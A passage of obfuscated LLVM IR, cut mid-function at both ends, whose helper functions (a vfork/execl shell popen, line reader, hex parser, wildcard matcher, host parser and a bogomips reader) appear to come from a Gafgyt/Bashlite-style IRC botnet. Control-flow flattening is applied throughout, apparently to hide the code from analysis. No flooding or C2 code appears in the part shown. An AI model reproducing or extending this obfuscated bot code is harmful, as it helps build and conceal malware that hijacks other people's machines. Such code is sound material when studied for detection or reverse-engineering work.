  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -430130961, i32 -445705808
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -309260210, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 1685966779, i32 443571440
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 -614281799, i32 1698518723
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #4
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 1698518723, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -900157450, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 -1043312118, i32 -695284395
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #4
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 -695284395, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -900157450, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %112, i8* null) #4
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 1515768036, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 -253773586, i32 434035865
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 -791737537, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 -791737537, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 -309260210, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 708912994, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 708912994, label %first
    i32 -2017227551, label %13
    i32 500107410, label %21
    i32 -527793242, label %22
    i32 -396157928, label %30
    i32 1503243750, label %37
    i32 -1321130982, label %41
    i32 -1720468562, label %45
    i32 -1409335230, label %47
    i32 -584896714, label %56
    i32 1716927065, label %57
    i32 -1139994382, label %64
    i32 4856903, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 500107410, i32 -2017227551
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 500107410, i32 -527793242
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 4856903, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #4
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #4
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #4
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #4
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #4
  store i32 -396157928, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 1503243750, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -1321130982, i32 -1720468562
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 -1720468562, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 -396157928, i32 -1409335230
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #4
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 -584896714, i32 1716927065
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 -1139994382, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 -1139994382, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 4856903, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1643256934, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1643256934, label %9
    i32 1138234897, label %13
    i32 -503519006, label %18
    i32 -499625736, label %27
    i32 907003704, label %29
    i32 -1650806324, label %39
    i32 1436625077, label %43
    i32 -113386640, label %44
    i32 93321761, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 1138234897, i32 -499625736
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -503519006, i32 -499625736
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -499625736, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 907003704, i32 -1650806324
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -1643256934, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 1436625077, i32 -113386640
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 93321761, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 93321761, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 2101049897, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2101049897, label %4
    i32 1051910364, label %10
    i32 -1726032728, label %13
    i32 -806738824, label %15
    i32 1696849838, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 1051910364, i32 -1726032728
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 -1726032728, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 -806738824, i32 1696849838
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 2101049897, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2101142152, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -2101142152, label %NodeBlock5
    i32 -883349179, label %NodeBlock
    i32 -807176650, label %LeafBlock3
    i32 -1733117685, label %LeafBlock1
    i32 -1827534573, label %LeafBlock
    i32 -1478295927, label %14
    i32 -1374281814, label %18
    i32 -2054808147, label %25
    i32 304732432, label %31
    i32 71381626, label %38
    i32 1122855405, label %39
    i32 1098590599, label %42
    i32 -2122850202, label %48
    i32 -1885966294, label %56
    i32 -1829300024, label %NewDefault
    i32 1160820207, label %59
    i32 -1685946219, label %70
    i32 -1609256739, label %78
    i32 -308940030, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 -1827534573, i32 -883349179
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -1733117685, i32 -807176650
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 1098590599, i32 -1829300024
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -1374281814, i32 -1829300024
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -1478295927, i32 -1829300024
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 -308940030, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 -2054808147, i32 1122855405
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 304732432, i32 71381626
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 71381626, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 1122855405, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 -308940030, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -2122850202, i32 -1885966294
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 -1885966294, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 -308940030, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1160820207, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -1685946219, i32 -1609256739
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 -1609256739, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 -308940030, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #4
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -960756427, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -960756427, label %first
    i32 -634516826, label %13
    i32 -1322271201, label %14
    i32 -1364225039, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -634516826, i32 -1322271201
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1364225039, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1364225039, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 -1125307986, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1125307986, label %3
    i32 -976937250, label %8
    i32 -1260944379, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 -976937250, i32 -1260944379
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 -1125307986, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -1440081514, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1440081514, label %8
    i32 -551549318, label %14
    i32 -260118461, label %21
    i32 722107342, label %24
    i32 997886167, label %30
    i32 564123604, label %36
    i32 -1630527480, label %41
    i32 -698775433, label %43
    i32 557114895, label %46
    i32 -429227623, label %47
    i32 -2091396837, label %57
    i32 -326005678, label %66
    i32 889561501, label %68
    i32 -1820584222, label %74
    i32 233221996, label %79
    i32 1401655652, label %82
    i32 1252285398, label %88
    i32 81995306, label %90
    i32 -985218821, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 -551549318, i32 81995306
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
